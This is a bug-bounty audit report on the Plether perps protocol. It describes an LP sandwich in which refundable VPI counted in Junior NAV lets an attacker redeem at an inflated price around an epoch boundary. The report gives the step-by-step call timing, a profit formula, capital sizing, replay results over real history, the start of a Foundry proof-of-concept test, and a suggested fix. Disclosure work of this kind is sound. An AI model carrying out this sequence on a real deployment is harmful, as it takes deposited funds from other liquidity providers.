# \#99266 [SC-Critical] VPI LP sandwich: refundable VPI is counted in Junior NAV, so an attacker redeems it and the LPs who stay pay the refund

**Submitted on Nov 12th 2026 at 18:29:56 UTC by @RowanDamisch for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99266
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Positive VPI paid on a skew-increasing open is booked into Junior NAV at once, and the same position gets it back in full when its close reverses the skew. LP share pricing keeps no reserve for that refund. A Junior LP that redeems between the open and the close leaves with its share of the refundable VPI, and the LPs that stay pay the refund. One actor holding a Junior lot and a trader account runs the sequence around an LP epoch boundary with public calls only: queue the redemption, open on the heavier side minutes before H, settle epoch H, close. The profit is taken out of the Junior balances the remaining LPs already hold. On a fork of the v2.0.0 deployment at a real boundary (2 Nov 2026 10:00 UTC), with the signed Pyth payloads the Plether oracle worker posted and no mocks, the attacker nets +39 640.62 and the other Junior LPs lose 76 708.50 (control: +578.56 and −65.76). Replayed over 9.5 days of the deployment's real history (60 cycles every 3 hours, real prices and real user activity), the attacker profits in 59 of 60 cycles and nets +2 157 762 (+2 110 086 above ordinary LP income). It takes VPI from the LPs who stay in all 60 cycles, and they end 3.7 % lower. Put simply: every cycle the attacker gets paid, the Junior LPs who stay foot the bill, and nothing in the protocol stops it or gives the money back. We suggest reserving refundable positive VPI as a pool liability; in our check with a minimal patch the attacker loses 761.12 per cycle and the honest LP keeps its balance.

## Vulnerability Details

A skew-increasing open pays positive VPI into `HousePool`. The pool books it as claimant revenue with
`CashArrived`, so it raises `accountedAssets` and, through reconcile, Junior NAV at once. A later skew-reducing close
of the same position refunds that VPI from the pool. The lifetime clamp only stops the refund from exceeding what the
position paid (`proportionalAccrual + vpiDelta >= 0`), so a round trip refunds the full amount.

While the position is open, Junior NAV therefore contains value that the pool will pay back to the trader. LP share
pricing does not reserve it. An LP that redeems in this window is paid its pro-rata share of that value. When the
position closes, the refund is paid by the LPs that stayed.

One actor controls every step with three permissionless roles: a Junior LP address, a trader address, and the
`settleLpEpoch` keeper call. Around a single epoch boundary H:

- **H − 10 min.** The LP address requests redemption of all its Junior shares (before the 5-minute cutoff, so it
  targets H).
- **H − 5 min … H.** The trader address opens on the heavier side of the book and pays VPI. Size: the largest that
  keeps the attacker's own redemption fundable.
- **H + 1 min.** Anyone (the attacker as keeper in the PoCs) settles epoch H; the redemption is funded at the inflated
  NAV.
- **Right after.** The trader closes; the full VPI is refunded from a pool that now belongs only to the other LPs.

The PoCs request at H − 10 min to leave a margin before the cutoff. A request lands in epoch H while
`block.timestamp < lpEpochStart(H) − 5 minutes` (`TrancheVault.sol:548-551`), so any time from the end of the 1-hour
cooldown up to H − 301 s works. The epoch follows the timestamp of the block that includes the request.

The position is open for a few minutes. The trader leg loses its two execution fees and the price move over those
minutes. The LP leg gains its share of the VPI, and that gain is paid out of the Junior balances of the remaining LPs.
The cycle repeats every ~3 hours with the same capital (activation epoch + 1-hour cooldown + exit epoch).

**Put simply:** every cycle the attacker gets paid, the Junior LPs who stay foot the bill, and nothing in the protocol
stops it or gives the money back.

**One real cycle.** A Foundry test forks the v2.0.0 deployment on Arbitrum Sepolia at block 325 251 437 and runs the
cycle around the boundary of 2 Nov 2026 10:00 UTC. It uses the signed Pyth payloads the Plether oracle worker posted at
those moments and mocks nothing. The attacker holds 57.75 % of Junior and opens 93.9M LONG. It nets **+39 640.62**
(control +578.56), and the other Junior LPs lose **76 708.50** (control −65.76).

**Every cycle over 9.5 days of real history.** A replay re-executes the deployment's real transactions with the
attacker inserted, using real signed prices and real user activity. The attacker runs one cycle every 3 hours while
the basket trades: 60 cycles from 2 to 11 Nov 2026.

- The other Junior LPs lose **3 717 330 (3.7 % of their balance)**, in **all 60** cycles.
- The attacker gains **+2 110 086** from the attack (+2 157 762 in total, including +47 676 of ordinary LP income).
- The rest of their loss (1 607 244) matches the open execution fees collected by the protocol treasury (1 612 889).
- **59 of 60 cycles are profitable** for the attacker.

**Suggested fix.** We suggest reserving refundable positive VPI as a pool liability until the position settles it.
We checked the idea with a minimal patch on the repository suite: the attacker loses 761.12 per cycle instead of
making 516.04, the honest LP keeps its balance, and the trader still gets its VPI back.

### Root cause

1. **Positive VPI becomes LP equity on open.** `CfdEngineSettlementSidecar.executeOpen` routes the open's trade cost
   (VPI + fee, minus the protocol-credited fee) into the pool as `recordClaimantInflow(Revenue, CashArrived)`
   (`CfdEngineSettlementSidecar.sol:454-463`), which increments `accountedAssets` (`HousePool.sol:640-641`).
2. **LP pricing has no term for refundable VPI.** Reconcile and share pricing use
   `physicalAssets − traderClaims ± terminalLpPriceDelta` (`HousePoolAccountingLib.buildReconcileSnapshot`,
   `HousePoolAccountingLib.sol:60-78`). Open positions' accrued positive VPI is not a liability anywhere in this sum.
3. **The close refunds it in full.** `CloseAccountingLib.buildCloseState` computes a fresh curve delta and clamps it
   only so that lifetime VPI stays non-negative (`CloseAccountingLib.sol:103-118`). Reversing the same skew therefore
   returns the accrued amount. The planner pays it from free pool cash (`CfdEnginePlanLib.sol:973-978`) and the
   sidecar transfers it out of the pool (`CfdEngineSettlementSidecar.sol:621-623`).
4. **Redemption is priced between the two.** `HousePool._settleLpEpoch` funds matured redemptions at the reconciled
   principal of the moment it runs (`HousePool.sol:824-942`). Any LP that exits after (1) and before (3) leaves with
   its share of the refundable amount.

### What the code and documentation state

- **LP sandwich in the code.** `CloseAccountingLib.sol:112-114` introduces the lifetime clamp with: *"Prevents LP
  sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes to extract a net-negative
  lifetime VPI rebate."* The clamp bounds the trader leg to the VPI it paid. The LP leg of open → LP withdrawal →
  close redeems its share of that VPI, and with the clamp active the sequence is net-profitable.
- **Close-time rebate.** `SECURITY.md:871-872` and `WHITEPAPER.md:885-886` define the rebate as paid from free pool
  cash and keep anticipated VPI out of terminal `K`. They contain no transfer from the LPs who stay to the LPs who
  leave.
- **VPI reserve.** The VPI reserve *"cannot be extracted by LPs before its account obligation settles"*
  (`ACCOUNTING_SPEC.md:821-822`; same rule in `WHITEPAPER.md:887-888`). The code holds it for negative VPI on the
  trader's account (`vpiRebateReserveAssets`). Positive VPI awaiting refund has no reserve and leaves with LP exits
  before the close settles.
- **Known limitations.** The `VPI limitations` (`SECURITY.md:1434-1444`) and `LP accounting limitations`
  (`SECURITY.md:1380-1399`) contain no LP value transfer through refundable VPI.

### Known issues and prior audits

- **Audits and known issues.** The published audits (Cantina, pre-audit, collaborative review, Cecuro AI, Scan) and the
  program's known issues contain no finding on LP pricing of refundable positive VPI.
- **Trader side.** The project's VPI round-trip tests (`accounting/close/VpiRoundTripAccounting.t.sol`) cover the
  trader leg: the trader does not profit from a VPI round trip. That holds in this attack too.
- **LP side.** The LP fixtures `shared/HousePoolTestBase.sol` and `shared/AtomicLpEpochSettlementFixture.sol`, and the
  LP NAV tests `DeltaNeutralDepositNavTest`, `AsyncLpEpochSettlementTest`, `SymmetricNavEntryCancellationTest` and
  `PerpValueConservationInvariantTest`, run with `vpiFactor = 0`. They price LP entry and exit without VPI.

## Impact Details

**Critical — Direct theft of user funds.** The attacker's profit is taken out of the Junior balances that the
remaining LPs already hold.

**What is taken.** A Junior LP's funds are its share of `juniorPrincipal`. Junior `TrancheVault.totalAssets` is the
Junior principal (`TrancheVault.sol:510-513`); revenue is credited to it at reconcile and losses are debited from it
(`HousePoolWaterfallAccountingLib.sol:140-158`, `:167-178`). A Junior share has no separate yield to claim.
`_settleLpEpoch` reconciles first (`HousePool.sol:835`), so the VPI booked on open is in `juniorPrincipal` when the
attacker's redemption is funded (`HousePool.sol:886-887`). The close refunds the VPI out of the pool, and the next
reconcile debits it from `juniorPrincipal`, now held only by the remaining LPs.

**One cycle.** Both PoCs assert that the remaining LPs lose against the control.

| PoC | other LPs before the open | end, no attack | end, attack | change with the attack |
|---|---:|---:|---:|---:|
| fork, real cycle of 2 Nov 2026 10:00 UTC | 101 003 496.03 | 101 003 430.27 | 100 926 787.53 | **−76 708.50** |
| repository suite (honest LP bob) | 2 000 898.63 | 2 000 898.63 | 2 000 002.39 | **−896.24** |

**60 cycles over 9.5 days of real history.** The replay (PoC section 3) is compared with the same history, deposits and
redemptions without the trades.

| who | USDG |
|---|---:|
| **other Junior LPs** | **−3 717 330** (3.7 % of their balance) |
| **attacker** | **+2 110 086** |
| protocol treasury (open execution fees) | +1 612 889 |

The other LPs lose in **60 of 60** cycles; the attacker profits in **59 of 60**. Against the real history without the
attacker at all, the other Junior LPs end 3 823 522 lower.

The one losing cycle (4 Nov 01:00 UTC, −5 997) lost on the price move: −23 844 of price against +17 847 for the rest
of the cycle (its share of the VPI minus fees). It had
the smallest expected profit of the cycles on the large pool (+12 073). An attacker removes such cycles by hedging the
position's price for the few minutes it is open, or by trading only when the expected profit is well above the usual
price move (median 4 590, 90th percentile 10 321 per cycle). In this history, trading only at an expected profit of at
least 15 000 leaves 56 cycles, all 56 profitable, with a total of +2 158 600.

**Repeated, the loss reaches the deposit.** After three cycles (9 hours) bob holds 1 998 209.83 against his 2 000 000
deposit (asserted in `test_vpiSandwich_repeats`).

**Who loses.** Junior LPs that are in the pool when the position closes, including LPs that deposit while it is open.
Senior is shielded by the waterfall.

**The loss grows with the pool.** The VPI an attacker can make refundable in one cycle scales with pool depth, so every
new LP deposit enlarges what is taken from all Junior LPs. On the deployment, cycles earned 1 190–2 120 on a pool of
about 1M and up to 111 640 on a pool of about 100M.

**The profit is the VPI of the LPs who stay, not the price.** The price moved against the attacker in 30 of 60 cycles,
and it still profited in 29 of them. Over all 60 cycles the price cost it 76 871; with the price move removed it nets
+2 234 633.

**Refundable VPI moves between LPs without an attacker too.** Junior NAV carries the refundable VPI of all open
positions: 34 091 (3.4 bps of Junior) at block 325793624, 110 212 (10.9 bps) at 326411898 and 127 134 (12.6 bps) at
326469861 on the live deployment. Every redeeming LP takes its share of it, and the LPs that stay pay the part that is
refunded when those positions close. The attack concentrates this transfer and repeats it.

**Why Critical.** The finding is the program's Critical impact *"Direct theft of any user funds, whether at-rest or
in-motion, other than unclaimed yield"*:

- **User funds.** The loss is taken from the Junior LPs' principal, the balance they deposited and hold. Repeated
  cycles take an honest LP below its deposit.
- **At rest.** The victims do nothing; they only hold Junior shares while the attacker runs the cycle.
- **Direct theft.** The attacker receives the money in the same cycle, through public calls only, with no trusted role
  and no action by the victims.
- **Not unclaimed yield.** A Junior share has no separate yield; the money comes out of `juniorPrincipal`.
- **Real and repeatable.** On 9.5 days of real history the other Junior LPs lose 3 717 330 (3.7 %), in 60 of 60
  cycles, and the attacker takes 2 110 086, profitable in 59 of 60. The amount grows with every new deposit into the
  pool.

### Attack economics

**Profit per cycle, exact:**

```
profit = c + ⌊shares × (VPI + U) / supply⌋ − F_open − F_close − L − K − B
```

- `shares / supply`: the attacker's fraction of Junior shares at the settlement of H;
- `VPI = C(S₀ + N) − C(S₀)`, `C(S)` the floor-rounded `k·S²/(2D)` (`CfdMath.sol:118-139`); `N` is the notional
  opened, `S₀` the existing skew on that side, `D` the VPI depth;
- `U = lots × |P_H − P_open|`: the open's adverse execution shift, carried in Junior NAV at the settlement mark;
- `F_open`, `F_close = ⌊lots × P_exec × executionFeeBps / 10 000⌋` (`OpenAccountingLib.sol:133-134`,
  `CloseAccountingLib.sol:118-119`);
- `L = lots × |P_close − P_open|`: the realized price loss from the adverse shift on both trades;
- `K`: carry over the position's lifetime; `B`: the execution bounty (zero when the attacker executes its own orders);
- `c`: the same LP lot's result over the window without the trade (the control run).

Each term was read from the events of the repository PoC run (`PositionOpened`, `PositionClosed`, `CarryRealized`,
`ActionRebateSettled`, `BountyCredited`); their sum equals the measured profit to one atom (516.038345 vs 516.038346).
With the same shift σ on both trades it reads `profit ≈ s·VPI − 2·f·N − (2 − s)·N·σ/P`, with `s = shares/supply` and
`f = executionFeeBps / 10 000`. VPI is quadratic in `N` and the fees are linear, so the attacker fills the remaining
`maxSkewRatio` room.

**Where the attacker's profit starts.** The cycle is profitable once the attacker's share of Junior exceeds
`s* = 2f · N / VPI`. At release parameters that is about 42 % of Junior on a balanced book, 33 % at 15 % existing skew
and 24 % at 37 % skew, never below 20 %. On the real deployment the attacker's trades turned profitable from
26.7–42.4 % of Junior, median 31.3 % (`0.0008 × notional / VPI paid`, from `replay_cycles.csv`). The attacker held
48.5–73 %, above that point in all 60 cycles.

**Where the attacker's result comes from** (60 cycles of real history, USDG):

| | |
|---|---:|
| VPI taken from the LPs who stayed (share × VPI) | +5 485 417 |
| execution fees, open and close (4 bp each on 4.03B notional) | −3 225 778 |
| price move on its positions | −76 871 |
| remainder: ordinary LP income, execution shift, carry, rounding | −25 006 |
| **attacker net** | **+2 157 762** |
| less the ordinary LP income of the same deposits without the trades | −47 676 |
| **attack effect** | **+2 110 086** |

Per cycle: worst −5 997, median +36 565, best +111 640.

**Bound per cycle.** VPI depth is `D = physicalAssets − traderClaims` and the skew cap is `maxSkewRatio × D`
(`CfdEnginePlanLib.sol:473,487`), so the refundable VPI added in one cycle is at most `C(0.4D) = 0.0008 × D`
(8 bps of depth at release parameters).

**Capital.** Capital is relative to the pool.

- The profit-maximizing share of Junior after the deposit, chosen per cycle by the replay's formula, was 48.5–73 %
  (median 57.6 %). A 57.6 % share means a deposit of 1.36× what the other LPs hold: 2.5–2.7M while the pool was 1M,
  and about 135M at the 99M pool.
- The profit is bounded by the pool, not by the attacker's capital: the open must keep the attacker's own redemption
  fundable from the other LPs' capital, so capital above the optimum adds nothing.
- The capital is not spent; it comes back at every exit, every 3 hours.
- Per *Attack Investment Amount*, capital is not a reason to downgrade. No flash loan is needed or possible
  (asynchronous LP epochs).

**Return on investment.** +2 110 086 above ordinary LP income in 9.5 days on a median deposit of 135.5M (1.6 %, 2.7 bps
per cycle). Per *Attacks With A Financial Risk To The Attacker*, low ROI alone is not sufficient for a downgrade; on
real prices 59 of 60 cycles were profitable.

**Execution.** Only public entry points: `requestDeposit`/`claimDeposit`/`requestRedeem`/`claimRedeem` on
`TrancheVault`, `commitOrder` and `executeOrder`/`executeOrderBatch` on `OrderRouter`, and the permissionless `settleLpEpoch` and
`updateMarkPrice`. Orders execute with the first signed Pyth payload published after their commit; the oracle worker
posts one every 6–30 s. If another keeper settles epoch H first, the result is the same, because the open executes
before H. No trusted role is involved. Time only advances to the epoch boundaries the protocol defines (activation,
the 1-hour cooldown, the next settlement), and no owner action reverses the transfer.

## Suggested fix

We suggest reserving refundable positive VPI in the pool, in the same way the protocol already reserves refundable
negative VPI on the trader's account (`vpiRebateReserveAssets` in `MarginClearinghouse`, target `CfdEnginePlanLib._negativeVpiReserveTarget`):

1. The Engine tracks `positiveVpiReserveAssets`, the sum of `max(vpiAccrued, 0)` over live positions. It updates the
   sum in the two functions that store a position: `settlementWritePosition` (opens and partial closes, which apply
   `posVpiAccruedDelta` and `posVpiAccruedReduction`) and `settlementDeletePosition` (full closes and liquidations).
2. The HousePool input snapshot (`CfdEngineProtocolLens.getHousePoolInputSnapshot`) counts the sum together with the
   trader claims (`traderClaimBalanceAssets`). In `HousePoolAccountingLib` that field is `terminalLiabilities` of
   `buildReconcileSnapshot` and part of `reserved` in `buildWithdrawalSnapshot`. The reserve is therefore outside the
   equity that reconcile distributes to the tranches, outside share pricing on deposit and redemption, and outside
   `getFreeAssets`.
3. A close pays its rebate out of the reserve. The part of the reserve that a close or a liquidation releases without
   a refund becomes LP revenue at that moment.

With this change the VPI part of an open no longer raises Junior NAV, and its refund no longer lowers it. An LP that
redeems between the open and the close receives no part of the refundable VPI. The `s × VPI` term leaves the profit
formula, and the attacker's result over the sequence is its execution fees and the price move. The clamp's guarantee
for traders stays as it is.

A regression test can check that, at an unchanged price, the redemption value of a Junior share is the same before the
open and after the close of any position.

**How we checked it.** `fix.patch` (in the [gist](https://gist.github.com/w64267685-afk/15356f492a9959c415dfee0b29b3c7a4)) is a minimal 14-line patch of points 1 and 2 in `CfdEngine.sol` and
`CfdEngineProtocolLens.sol`, written only to check the suggestion. `VpiLpSandwichFixCheck.t.sol` (in the gist) runs
the attack of `VpiLpSandwichPoC.t.sol` against it with the same scenario, release parameters and public path. From the
repository root, with the gist files in the parent directory:

```bash
git apply ../fix.patch
cp ../VpiLpSandwichFixCheck.t.sol packages/perps/test/perps/poc/
forge test --root packages/perps --match-path test/perps/poc/VpiLpSandwichFixCheck.t.sol -vv
```

| | `a82d4fef` | with fix |
|---|---:|---:|
| NAV step on open | +2 555.54 | −0.0014 |
| attacker LP exit | 2 001 277.15 | 1 999 999.99 |
| attacker LP exit, control | 1 999 999.99 | 1 999 999.99 |
| trader leg after close | 99 238.88 | 99 238.88 |
| attacker net per cycle | **+516.04** | **−761.12** |
| bob per cycle vs control | **−896.24** | +380.29 |
| bob after 3 cycles | 1 998 209.83 | 2 001 140.90 |
| `VpiLpSandwichFixCheck` | fail | pass |
| `VpiLpSandwichPoC` | pass | fail |

Without the fix the NAV step on open equals the VPI paid. In both cases the trader leg gets its VPI back and pays
only the two fees. With the fix bob gains the close fee, which stays in the pool, and ends above his 2 000 000
deposit.

We also ran five of the project's test files for VPI round trips, close accounting and LP NAV with `fix.patch`; all
46 tests pass: `VpiRoundTripAccounting` (2), `TerminalNavCloseConservation` (3), `LpEntryExitNavParity` (4),
`AsyncLpEpochSettlement` (28) and `EntryAndActivationBehavior` (9). We did not run the full test suite.

## References

- positive VPI booked as pool revenue on open: [CfdEngineSettlementSidecar.sol#L454-L463](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L463)
- `recordClaimantInflow` → `accountedAssets`: [HousePool.sol#L640-L641](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L641)
- LP pricing, `buildReconcileSnapshot`: [HousePoolAccountingLib.sol#L60-L78](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78)
- close VPI and lifetime clamp: [CloseAccountingLib.sol#L103-L118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)
- close rebate paid from free pool cash: [CfdEnginePlanLib.sol#L973-L978](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L973-L978)
- rebate transferred out of the pool: [CfdEngineSettlementSidecar.sol#L621-L623](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L623)
- redemption funding, `_settleLpEpoch`: [HousePool.sol#L824-L942](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L942)
- VPI depth and skew cap: [CfdEnginePlanLib.sol#L473](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L473) and [CfdEnginePlanLib.sol#L487](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L487)
- anticipated VPI outside terminal `K`: [SECURITY.md#L871-L872](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L871-L872)
- VPI reserve not extractable by LPs: [ACCOUNTING_SPEC.md#L821-L822](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L821-L822) and [WHITEPAPER.md#L885-L888](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L885-L888)
- VPI as a state potential: [WHITEPAPER.md#L816-L904](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L816-L904)
- release parameters: [DEPLOYMENT.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md)


## Link to Proof of Concept

https://gist.github.com/w64267685-afk/15356f492a9959c415dfee0b29b3c7a4

## Proof of Concept

## Proof of Concept

Three parts, each answering one question. The tests are Foundry tests under `packages/perps/test/perps/poc/` of a
clean `a82d4fef` checkout; no file under `src/` is changed.

1. **`VpiLpSandwichRealCycle.t.sol`**: one real attack cycle on a fork of the live v2.0.0 deployment, with the prices
   actually published, no mocks; about 1 min, needs an RPC with historical state. **Shows:** the attack works on the
   deployed contracts: attacker +39 640.62, other Junior LPs −76 708.50.
2. **`VpiLpSandwichPoC.t.sol`**: the same attack in the project's own test suite, no network; about 1 min. **Shows:**
   the mechanism step by step, and that repeated cycles take an honest LP below its deposit.
3. **`replay_cycles.csv`**: results of replaying 9.5 days of the deployment's real history with the attacker
   inserted. **Shows:** the attack repeats on real prices and real user activity: 59 of 60 cycles profitable, the
   other LPs lose in 60 of 60.

`fix.patch` and `VpiLpSandwichFixCheck.t.sol` are our check of the suggested fix (Suggested fix).

All five files are in the [secret gist](https://gist.github.com/w64267685-afk/15356f492a9959c415dfee0b29b3c7a4).

#### Setup

The test files, `replay_cycles.csv` and `fix.patch` are in the [secret gist](https://gist.github.com/w64267685-afk/15356f492a9959c415dfee0b29b3c7a4); `VpiLpSandwichPoC.t.sol` is also inlined at the end. Download the gist files into an empty directory, open a shell in that directory and run:

```bash
git clone https://github.com/immunefi-team/audit-comp-plether && cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/perps/poc
cp ../VpiLpSandwichPoC.t.sol ../VpiLpSandwichRealCycle.t.sol packages/perps/test/perps/poc/
```

All commands below run from the repository root (`audit-comp-plether`).

#### 1. `VpiLpSandwichRealCycle.t.sol` — one real cycle on a fork of the v2.0.0 deployment, no mocks

**What it shows:** the attack works on the deployed contracts at a real moment, with the prices that were actually
published. The attacker nets +39 640.62 and the other Junior LPs lose 76 708.50.

The fork starts at the real state of Arbitrum Sepolia block 325 251 437 (2 Nov 2026 07:50 UTC). That is 2 h 10 min
before the LP epoch boundary H = 10:00 UTC.

Every price is a real signed Pyth payload (all six basket feeds). The Plether oracle worker
`0x1329a7fa975f2f8aa2cac86a833f03655201d34f` posted each one on-chain at that moment through
`Router.updateMarkPrice`. The six payloads are constants in the file, each with its transaction hash.

Every step is a public call:

| time (UTC) | step | payload published |
|---|---|---|
| 07:50:05 | `Router.updateMarkPrice`; Junior `requestDeposit` of 138 110 704.45 (activates at B = 08:00) | 07:50:03 |
| 08:01:08 | `Router.settleLpEpoch` (epoch B); `claimDeposit` | 08:01:06 |
| 09:50:05 | `Router.updateMarkPrice`; `requestRedeem` of all shares (epoch H) | 09:50:03 |
| 09:55:00 / 09:55:03 | `commitOrder` LONG / `executeOrderBatch` with the payload | 09:55:01 |
| 10:01:07 | `Router.settleLpEpoch` (epoch H); `claimRedeem` | 10:01:05 |
| 10:01:10 / 10:01:13 | `commitOrder` close / `executeOrderBatch` with the payload | 10:01:11 |

How the attack is set up:

- **Deposit.** It is the one the replay's formula (section 3) chose at this moment: 57.75 % of Junior.
- **Open size.** The largest on the heavier side that keeps the attacker's own redemption fundable, i.e. pool free
  assets ≥ 105 % of its Junior assets. The test searches it in snapshots and then executes it once.
- **Execution.** The attacker executes its own orders.
- **Control.** The same window runs again without the trade.

Three things are test-side only:

- the attacker's USDG comes from `deal`;
- time moves with `vm.warp`/`vm.roll`;
- a one-line stub at the ArbSys precompile `0x64` returns `block.number`. The local EVM has no Arbitrum precompiles,
  and the Router reads `arbBlockNumber()` for its same-block check.

Real transactions of other users inside the 2 h 10 min are not replayed here; section 3 covers them.

The test needs an RPC that serves historical state, for example the public Tenderly gateway:

```bash
FORK_RPC=https://arbitrum-sepolia.gateway.tenderly.co forge test --root packages/perps --match-path test/perps/poc/VpiLpSandwichRealCycle.t.sol -vv
```

Expected: 1 test passes, in about a minute on a first run (compilation and fork reads included). The log shows:

- LONG opened at 09:55:03: 93 949 930.41 notional, 98.7 % of the remaining `maxSkewRatio` room; **VPI paid 187 233.61**.
- Pool free assets after the open: 145 316 591.40, against the attacker's Junior assets of 138 219 802.56.
- Redemption 100 % funded (asserted).
- **Attacker net +39 640.62**, against +578.56 in the control (asserted above zero and above the control).
- Other Junior LPs: 101 003 496.03 before the open. With the attack they end at 100 926 787.53 (**−76 708.50**);
  without it, at 101 003 430.27 (−65.76).
- Their loss against the control, 76 642.75, covers the attacker's gain over the control (asserted).

#### 2. `VpiLpSandwichPoC.t.sol` — the same attack in the repository's own test suite (no network)

**What it shows:** the mechanism, without any network. The open raises Junior NAV by exactly the VPI paid, the
trader pays only its two fees, the honest LP pays the attacker's profit, and repeated cycles take it below its deposit.

This test runs anywhere, without an RPC. It is built on the repository's `HousePoolTestBase`, with the `DEPLOYMENT.md`
release parameters applied and asserted through the normal admin path. Pyth and USDG are mocked, as the program allows.
Every trade is a public `commitOrder` + `executeOrder`; the LP exit is `settleLpEpoch` + `claimRedeem`. Besides the
attacker's profit and the honest LP's loss, it asserts three things the fork test does not:

- the Junior NAV step on open equals the VPI paid (2 555.54);
- the attacker's trader leg pays only its two execution fees;
- repeated, the attack takes an honest LP below its deposit: after three cycles (9 hours) bob holds 1 998 209.83 of the
  2 000 000 he deposited.

```bash
forge test --root packages/perps --match-contract VpiLpSandwichPoC -vv
```

Expected: 2 tests pass. One cycle: attacker **+516.04** (control −0.01); honest LP bob **−896.24** (unchanged without
the attack, asserted). Three cycles: attacker +516.04, +516.16, +516.39.

#### 3. Real-history replay (results: `replay_cycles.csv`)

**What it shows:** the attack repeats on real history: 60 cycles over 9.5 days with real prices and real user
activity, 59 profitable for the attacker, the other LPs losing in all 60. This part is a results file; its numbers are
summarized in Impact and Attack economics. The rest of this section describes how the replay was run.

The full replay takes 1.5–3 hours (Python + Anvil over the whole history, with an archive RPC), so it is not part of
the PoC; the per-cycle results are attached, and the harness is available on request.

**Setup.** The real transactions of the v2.0.0 deployment are re-executed in order on a local Anvil fork. The control
world, the same history without the attacker, covers all 1 789 transactions from 31 Oct to 11 Nov 2026 and ends with
the real chain's LP balances. The attack world forks the real chain 2 h 20 min before the first cycle (block
325 123 539) and replays the 1 592 real transactions from there.

**Attacker schedule.** The attacker runs one cycle every 3 hours while the basket trades: 60 cycles, from 2 Nov 01:00
to 11 Nov 13:00 UTC (9.5 days). Weekends have no cycles because the FX basket is closed.

**Steps in each cycle:**

1. Deposit into Junior at B − 10 min (B = H − 2 h) and claim the shares at B + 1 min.
2. Request the full redemption at H − 10 min.
3. Open with the first signed Pyth payload the oracle worker posted after H − 5 min. Commit 1 s before its publish
   time and execute 2 s after it.
4. Claim the redemption at H + 1 min.
5. Close with the next worker payload.

Real users' orders, deposits and the keeper's settlements run around it.

**How the attacker decides.** It uses public views only (`riskParams`, `sides`, `CAP_PRICE`, `getFreeAssets`,
`lastMarkPrice`). At each deposit it picks the deposit D that maximizes the expected profit E of the coming open:

```
s     = D / (other LPs' Junior + D)
depth = pool depth + D
N     = min(0.99 × (maxSkewRatio × depth − skew), largest size that keeps the full redemption fundable)
VPI   = 0.5 × k × ((skew + N)² − skew²) / depth
E     = s × VPI − N × (2 × 4 bp fee + (2 − s) × 25 % × conf/price)
```

At the open it recomputes E from the actual VPI and trades only when E > 0. The sum of E at the opens was 2 098 597,
against 2 157 762 realised.

**LP-only twin.** It runs the same deposit rule and redemptions without the trades. It separates the attack from the
ordinary LP income the attacker would earn anyway.

**Where the attack world differs from the real chain.** 91 of its 1 592 rows behave differently from the real chain.
This is the trace of the attacker:

- the keeper's epoch settlement also processes its deposit or redemption;
- honest orders pay a different VPI on the deeper pool;
- 10 real orders that no longer fit under the skew cap are skipped, with later order ids aligned to the real chain.

**`replay_cycles.csv`** has one line per cycle, with these columns:

- share of Junior, deposit, side, notional;
- VPI paid, VPI taken from the other LPs;
- price move on the attacker's position;
- attacker net, and attacker net without the price move;
- the twin's result, the attack effect;
- the other LPs' change over the cycle.

Summed over the 60 lines, it gives the attacker's net, the attack effect, the VPI taken, the price move and the cycle
counts in Impact and Attack economics.

### Test code: `VpiLpSandwichPoC.t.sol`

`VpiLpSandwichRealCycle.t.sol` (with its six signed payloads) and `replay_cycles.csv` are in the gist.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {HousePoolTestBase} from "../shared/HousePoolTestBase.sol";
import {console2} from "forge-std/console2.sol";

/// Refundable positive VPI is counted as LP equity while the position is open.
///
/// A skew-increasing open pays VPI into HousePool; reconcile prices LP shares as pool cash - trader claims + price
/// curve, so the VPI immediately raises Junior NAV. A skew-reducing close of the same position refunds exactly that VPI
